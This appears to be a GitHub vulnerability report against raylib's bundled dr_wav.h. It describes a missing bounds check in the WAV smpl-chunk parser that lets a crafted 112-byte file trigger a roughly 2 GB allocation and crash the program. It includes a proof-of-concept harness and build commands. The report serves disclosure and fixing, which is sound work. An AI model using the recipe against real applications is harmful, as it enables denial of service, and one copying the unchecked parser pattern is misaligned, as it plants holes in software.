# Issue description

`src/external/dr_wav.h` (bundled with raylib) contains a vulnerability in the `smpl` chunk metadata parser (Stage 1 / count pass). The field `samplerSpecificDataSizeInBytes` is read from the WAV file and passed directly to `drwav__metadata_request_extra_memory_for_stage_2()` without validating it against the actual remaining chunk size. A crafted 112-byte WAV file triggers a ~2 GB memory allocation attempt, causing denial of service.

**Root cause** — `src/external/dr_wav.h` line 2779:

```c
drwav_uint32 samplerSpecificDataSizeInBytes = drwav_bytes_to_u32(buffer);

drwav__metadata_request_extra_memory_for_stage_2(
    pParser, sizeof(drwav_smpl_loop) * loopCount, DRWAV_METADATA_ALIGNMENT);
drwav__metadata_request_extra_memory_for_stage_2(
    pParser, samplerSpecificDataSizeInBytes, 1);   /* <- no bounds check */
```

`samplerSpecificDataSizeInBytes` is attacker-controlled. The only existing check validates `loopCount == calculatedLoopCount`, but places no upper-bound constraint on `samplerSpecificDataSizeInBytes` relative to the actual chunk size. Setting it to `0x7FFFFFFF` causes the pool allocator to request `malloc(~2 GB)`, crashing the application.

**Note:** The upstream fix for this issue exists in dr_libs but has not yet been propagated to raylib's bundled copy of `dr_wav.h`.

---

# Environment

- Platform: Linux x86-64
- raylib version: master (commit f00317b)
- dr_wav.h version: v0.14.6 (bundled at `src/external/dr_wav.h`)
- Compiler: gcc 13 with `-fsanitize=address`

---

# Issue Screenshot

<img width="651" height="266" alt="Image" src="https://github.com/user-attachments/assets/687063bd-4462-42b9-b72a-24db9ce3b39c" />

# Code Example

**Step 1 — Attach `poc.wav` (112 bytes)**

The file contains a `smpl` chunk where:
- `loopCount = 1 = calculatedLoopCount` → passes the only existing check
- `samplerSpecificDataSizeInBytes = 0x7FFFFFFF` (~2 GB) → no bounds check

**Step 2 — Compile and run**

```c
/* poc_harness.c — place in raylib repo root */
#define DR_WAV_IMPLEMENTATION
#include "dr_wav.h"   /* from src/external/dr_wav.h */
#include <stdio.h>
#include <stdlib.h>

#define THRESHOLD (64UL * 1024 * 1024)
static size_t g_max = 0;

static void *log_malloc(size_t sz, void *u) {
    (void)u; if (sz > g_max) g_max = sz;
    if (sz > THRESHOLD) {
        printf("[ATTACK ALLOC] %zu bytes (~%.1f GB)\n",
               sz, (double)sz / (1024.0*1024*1024));
        return NULL;
    }
    return malloc(sz);
}
static void  log_free   (void *p, void *u) { (void)u; free(p); }
static void *log_realloc(void *p, size_t sz, void *u) {
    (void)u; if (sz > g_max) g_max = sz;
    return (sz > THRESHOLD) ? NULL : realloc(p, sz);
}

int main(int argc, char **argv) {
    drwav_allocation_callbacks cb = { NULL, log_malloc, log_realloc, log_free };
    drwav wav;
    drwav_init_file_with_metadata(&wav, argc > 1 ? argv[1] : "poc.wav", 0, &cb);
    printf("Max alloc: %zu bytes (0x%zX)\n", g_max, g_max);
    return g_max > THRESHOLD ? 0 : 1;
}
```

```bash
gcc -fsanitize=address -g -I src/external poc_harness.c -o poc_harness
./poc_harness poc.wav
# Expected: [ATTACK ALLOC] 2147483790 bytes (~2.0 GB)
```

Reproduced 3/3 on Linux x86-64.

